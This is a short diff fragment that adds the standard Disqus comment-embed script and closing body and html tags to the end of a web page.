+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
